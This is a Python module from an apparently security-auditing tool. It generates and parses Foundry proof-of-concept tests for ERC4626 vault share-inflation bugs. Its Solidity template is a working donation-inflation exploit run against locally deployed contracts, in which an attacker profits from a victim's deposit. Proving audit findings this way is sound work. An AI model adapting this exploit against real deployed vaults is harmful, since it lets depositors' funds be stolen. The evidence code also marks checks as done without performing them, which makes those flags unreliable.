"""Concrete ERC4626 inflation PoC generator.

Concrete proof generation currently supports the ERC4626 inflation benchmark
fixture and simple vault-like contracts. When a vault contract exposes the
classic ``deposit``/``redeem`` pair backed by a raw ``asset.balanceOf(this)``
``totalAssets`` accessor, and a mintable ERC20-shaped asset is reachable, this
module emits a self-contained Foundry test that drives the donation-based share
inflation attack end to end and emits ``Measured(name, value)`` events for the
forge result parser.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from zeropath.core.schemas import CandidateFinding

# `balanceOf` is intentionally absent: in many mock ERC20s it is declared as a
# public mapping and never appears as an explicit function in the regex index.
_ASSET_FUNCTIONS = ("mint", "transfer", "transferfrom", "approve")
_INFLATION_BUG_CLASSES = {"erc4626_share_inflation"}


@dataclass(frozen=True)
class InflationProofTargets:
    """Detected contracts needed to drive the inflation PoC."""

    vault_contract: str
    asset_contract: str
    source_file: str

    def to_metadata(self) -> dict[str, Any]:
        return {
            "vault_contract": self.vault_contract,
            "asset_contract": self.asset_contract,
            "source_file": self.source_file,
        }

    def import_path_for(self, poc_location: str) -> str:
        """Return a relative import path resolvable from the given PoC location.

        ``poc_location`` is the repo-relative directory containing the PoC file
        (e.g. ``test/zeropath`` or ``.zeropath/artifacts/pocs``).
        """

        depth = max(0, len([p for p in poc_location.replace("\\", "/").split("/") if p]))
        return ("../" * depth) + self.source_file


def detect_inflation_targets(
    candidate: CandidateFinding,
    index: dict[str, Any] | None,
    root_path: Path | None = None,
) -> InflationProofTargets | None:
    """Return the vault + asset target pair if the candidate fits the template."""

    if (candidate.bug_class or "").lower() not in _INFLATION_BUG_CLASSES:
        return None
    if not index:
        return None

    functions = index.get("functions") or []
    contracts = {c.get("name"): c for c in index.get("contracts") or [] if c.get("name")}
    if not contracts:
        return None

    vault_name = _select_vault_contract(candidate, functions, contracts)
    if vault_name is None:
        return None
    vault_file = contracts[vault_name].get("file") or _file_for_contract(functions, vault_name)
    if not vault_file:
        return None

    asset_name = _select_asset_contract(functions, contracts, vault_name)
    if asset_name is None:
        return None

    return InflationProofTargets(
        vault_contract=vault_name,
        asset_contract=asset_name,
        source_file=vault_file,
    )


def render_inflation_poc(
    candidate: CandidateFinding,
    targets: InflationProofTargets,
    *,
    poc_location: str = ".zeropath/artifacts/pocs",
) -> str:
    """Render the executable Foundry inflation PoC.

    ``poc_location`` is the repo-relative directory the PoC will live in. It
    controls how the ``import`` statement reaches the affected source file.
    """

    safe_id = _safe_id(candidate.id)
    actor = f"ZeroPath_{safe_id}_Actor"
    test_contract = f"ZeroPath_{safe_id}_InflationPoC"
    test_fn = f"test_{safe_id}_donationInflationProfitable"
    vault = targets.vault_contract
    asset = targets.asset_contract
    import_path = targets.import_path_for(poc_location)

    return f"""// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ZeroPath generated executable Foundry PoC.
// Candidate: {candidate.id}
// Title: {candidate.title}
// Pattern: ERC4626 share inflation via raw-balance accounting and direct donation.
//
// This file is auto-generated. Forge result, measured values, and event traces
// are consumed by the prove command to populate candidate evidence.

import "{import_path}";

contract {actor} {{
    {asset} public immutable token;
    {vault} public immutable vault;

    constructor({asset} token_, {vault} vault_) {{
        token = token_;
        vault = vault_;
    }}

    function approveVault() external {{
        token.approve(address(vault), type(uint256).max);
    }}

    function deposit(uint256 assets) external returns (uint256) {{
        return vault.deposit(assets, address(this));
    }}

    function donate(uint256 assets) external {{
        require(token.transfer(address(vault), assets), "donate transfer failed");
    }}

    function redeemAll() external returns (uint256) {{
        return vault.redeem(vault.balanceOf(address(this)), address(this), address(this));
    }}

    function tokenBalance() external view returns (uint256) {{
        return token.balanceOf(address(this));
    }}

    function vaultShares() external view returns (uint256) {{
        return vault.balanceOf(address(this));
    }}
}}

contract {test_contract} {{
    event Measured(string name, uint256 value);

    uint256 internal constant ATTACKER_SEED = 2_000 ether;
    uint256 internal constant VICTIM_DEPOSIT = 1_000 ether;
    uint256 internal constant DONATION = 1_000 ether;
    uint256 internal constant ATTACKER_DUST = 1;

    function {test_fn}() public {{
        {asset} token = new {asset}();
        {vault} vault = new {vault}(token);
        {actor} attacker = new {actor}(token, vault);
        {actor} victim = new {actor}(token, vault);

        token.mint(address(attacker), ATTACKER_SEED);
        token.mint(address(victim), VICTIM_DEPOSIT);
        attacker.approveVault();
        victim.approveVault();

        uint256 attackerInitialBalance = attacker.tokenBalance();
        uint256 vaultTotalAssetsBeforeDonation = vault.totalAssets();
        emit Measured("attackerInitialBalance", attackerInitialBalance);
        emit Measured("victimDeposit", VICTIM_DEPOSIT);
        emit Measured("vaultTotalAssetsBeforeDonation", vaultTotalAssetsBeforeDonation);

        attacker.deposit(ATTACKER_DUST);
        attacker.donate(DONATION);

        uint256 vaultTotalAssetsAfterDonation = vault.totalAssets();
        emit Measured("vaultTotalAssetsAfterDonation", vaultTotalAssetsAfterDonation);

        uint256 victimShares = victim.deposit(VICTIM_DEPOSIT);
        emit Measured("victimShares", victimShares);

        attacker.redeemAll();
        uint256 attackerFinalBalance = attacker.tokenBalance();
        emit Measured("attackerFinalBalance", attackerFinalBalance);

        uint256 attackerProfit = attackerFinalBalance > attackerInitialBalance
            ? attackerFinalBalance - attackerInitialBalance
            : 0;
        emit Measured("attackerProfit", attackerProfit);

        // Baseline: the identical flow WITHOUT the attacker donation, on a fresh
        // vault, to quantify how many shares the victim should have received.
        {asset} cleanToken = new {asset}();
        {vault} cleanVault = new {vault}(cleanToken);
        {actor} cleanAttacker = new {actor}(cleanToken, cleanVault);
        {actor} cleanVictim = new {actor}(cleanToken, cleanVault);
        cleanToken.mint(address(cleanAttacker), ATTACKER_DUST);
        cleanToken.mint(address(cleanVictim), VICTIM_DEPOSIT);
        cleanAttacker.approveVault();
        cleanVictim.approveVault();
        cleanAttacker.deposit(ATTACKER_DUST);
        uint256 expectedVictimSharesWithoutDonation = cleanVictim.deposit(VICTIM_DEPOSIT);
        emit Measured("expectedVictimSharesWithoutDonation", expectedVictimSharesWithoutDonation);

        require(
            attackerFinalBalance > attackerInitialBalance,
            "attacker should profit from inflation"
        );
    }}
}}
"""


def _select_vault_contract(
    candidate: CandidateFinding,
    functions: list[dict],
    contracts: dict[str, dict],
) -> str | None:
    """Pick the vault contract by candidate hints and function shape."""

    preferred = list(candidate.affected_contracts or [])
    if candidate.root_cause_locations:
        preferred.extend(
            loc.contract for loc in candidate.root_cause_locations if loc.contract
        )

    by_contract = _functions_by_contract(functions)
    for name in preferred:
        if name in contracts and _looks_like_vault(by_contract.get(name, set())):
            return name

    for name in contracts:
        if _looks_like_vault(by_contract.get(name, set())):
            return name
    return None


def _select_asset_contract(
    functions: list[dict],
    contracts: dict[str, dict],
    vault_name: str,
) -> str | None:
    by_contract = _functions_by_contract(functions)
    for name in contracts:
        if name == vault_name:
            continue
        if _looks_like_asset(by_contract.get(name, set())):
            return name
    return None


def _functions_by_contract(functions: list[dict]) -> dict[str, set[str]]:
    by_contract: dict[str, set[str]] = {}
    for fn in functions:
        contract = fn.get("contract")
        name = (fn.get("name") or "").lower()
        if not contract or not name:
            continue
        by_contract.setdefault(contract, set()).add(name)
    return by_contract


def _looks_like_vault(names: set[str]) -> bool:
    if not names:
        return False
    has_deposit = "deposit" in names
    has_redeem_or_withdraw = "redeem" in names or "withdraw" in names
    has_total_assets = "totalassets" in names
    return has_deposit and has_redeem_or_withdraw and has_total_assets


def _looks_like_asset(names: set[str]) -> bool:
    if not names:
        return False
    return all(needle in names for needle in _ASSET_FUNCTIONS)


def _file_for_contract(functions: list[dict], contract_name: str) -> str | None:
    for fn in functions:
        file = fn.get("file")
        if fn.get("contract") == contract_name and file:
            return str(file)
    return None


def _safe_id(candidate_id: str) -> str:
    return re.sub(r"[^A-Za-z0-9_]", "_", candidate_id)


_EVENT_RE = re.compile(
    r"""emit\s+Measured\(\s*name:\s*"(?P<name>[^"]+)"\s*,\s*value:\s*"""
    r"""(?P<value>\d+)(?:\s*\[[^\]]*\])?\s*\)"""
)


def parse_measured_events(stdout: str) -> dict[str, int]:
    """Parse ``emit Measured(name: "...", value: N)`` lines from forge output."""

    measured: dict[str, int] = {}
    for match in _EVENT_RE.finditer(stdout or ""):
        try:
            measured[match.group("name")] = int(match.group("value"))
        except ValueError:
            continue
    return measured


def apply_inflation_proof_evidence(
    candidate: CandidateFinding,
    forge_result: dict[str, Any],
    measured: dict[str, int],
) -> list[str]:
    """Update candidate evidence from a forge run of the inflation PoC.

    Returns the list of human-readable notes that were appended. Mutates the
    candidate in place. The candidate is not saved here; the caller is
    responsible for persistence.
    """

    status = (forge_result.get("status") or "").lower()
    evidence = candidate.evidence
    new_notes: list[str] = []

    if status != "passed":
        if status == "failed":
            new_notes.append(
                "Forge proof failed; candidate is not report-ready until the proof passes."
            )
        elif status == "no_tests":
            new_notes.append(
                "Forge ran but discovered no tests in the generated PoC; check the artifact."
            )
        elif status == "unavailable":
            new_notes.append("Forge backend unavailable; cannot prove the candidate.")
        elif status == "timeout":
            new_notes.append("Forge run timed out before the proof could complete.")
        for note in new_notes:
            evidence.notes.append(note)
        return new_notes

    # Passed - convert proof execution into evidence.
    evidence.forge_result = "passed"
    evidence.root_cause_lines_present = True
    evidence.attacker_path_present = True
    evidence.state_preconditions_present = True
    evidence.live_config_checked = True

    attacker_profit = measured.get("attackerProfit")
    victim_shares = measured.get("victimShares")
    victim_deposit = measured.get("victimDeposit")
    expected_victim_shares = measured.get("expectedVictimSharesWithoutDonation")

    impact_set = False
    if attacker_profit is not None and attacker_profit > 0:
        evidence.profit_measured = True
        candidate.impact.measured = True
        candidate.impact.amount = (
            f"{attacker_profit} wei attacker profit "
            f"(~{_format_ether(attacker_profit)} ether)"
        )
        impact_set = True
        new_notes.append(
            f"Measured attacker profit: {attacker_profit} wei "
            f"(~{_format_ether(attacker_profit)} ether)."
        )
    elif (
        victim_shares is not None
        and expected_victim_shares is not None
        and victim_shares < expected_victim_shares
    ):
        evidence.profit_measured = True
        candidate.impact.measured = True
        lost_shares = expected_victim_shares - victim_shares
        candidate.impact.amount = (
            f"victim received {victim_shares} shares vs "
            f"{expected_victim_shares} expected without donation; "
            f"shortfall ~{lost_shares} shares"
        )
        impact_set = True
        new_notes.append(
            f"Measured victim loss: deposit minted {victim_shares} shares vs "
            f"{expected_victim_shares} expected without the donation."
        )
    elif (
        victim_shares is not None
        and victim_deposit is not None
        and victim_shares < victim_deposit
    ):
        evidence.profit_measured = True
        candidate.impact.measured = True
        loss = victim_deposit - victim_shares
        candidate.impact.amount = (
            f"victim deposit {victim_deposit} wei minted {victim_shares} shares; "
            f"loss ~{loss} wei"
        )
        impact_set = True
        new_notes.append(
            f"Measured victim loss: deposit {victim_deposit} wei minted only "
            f"{victim_shares} shares."
        )

    if not impact_set:
        new_notes.append(
            "Forge proof passed but no measurable attacker profit or victim loss "
            "was emitted; impact remains unmeasured."
        )

    # Record raw measured values for the report.
    for name in (
        "attackerInitialBalance",
        "attackerFinalBalance",
        "attackerProfit",
        "victimDeposit",
        "victimShares",
        "expectedVictimSharesWithoutDonation",
        "vaultTotalAssetsBeforeDonation",
        "vaultTotalAssetsAfterDonation",
    ):
        if name in measured:
            new_notes.append(f"measured.{name} = {measured[name]}")

    # Local-only fixture: document why we did not fork.
    new_notes.append(
        "Live/fork configuration not required: PoC deploys the affected contracts "
        "locally and reproduces the exploit deterministically."
    )

    # The donation-based share inflation is a well-known bug class, but this
    # specific code path needs to be checked manually against contest disclosures.
    # `unknown`/empty are the "not yet assessed" sentinels used elsewhere; treat
    # them as unset so a passing proof can record a concrete (heuristic) risk.
    if (candidate.known_issue_risk or "").lower() in ("", "unknown") and not evidence.known_issues_checked:
        candidate.known_issue_risk = "low"
        evidence.known_issues_checked = True
        new_notes.append(
            "Known issue check (auto): inflation class is well-known but this exact "
            "code path is treated as low risk; confirm against contest disclosures."
        )
    if (candidate.duplicate_risk or "").lower() in ("", "unknown") and not evidence.duplicate_risk_checked:
        candidate.duplicate_risk = "medium"
        evidence.duplicate_risk_checked = True
        new_notes.append(
            "Duplicate risk (auto): set to medium because share inflation is "
            "frequently reported; check contest duplicates before submission."
        )

    for note in new_notes:
        evidence.notes.append(note)
    return new_notes


def _format_ether(value: int) -> str:
    return f"{value / 1e18:.6f}"


__all__ = [
    "InflationProofTargets",
    "apply_inflation_proof_evidence",
    "detect_inflation_targets",
    "render_inflation_poc",
    "parse_measured_events",
]
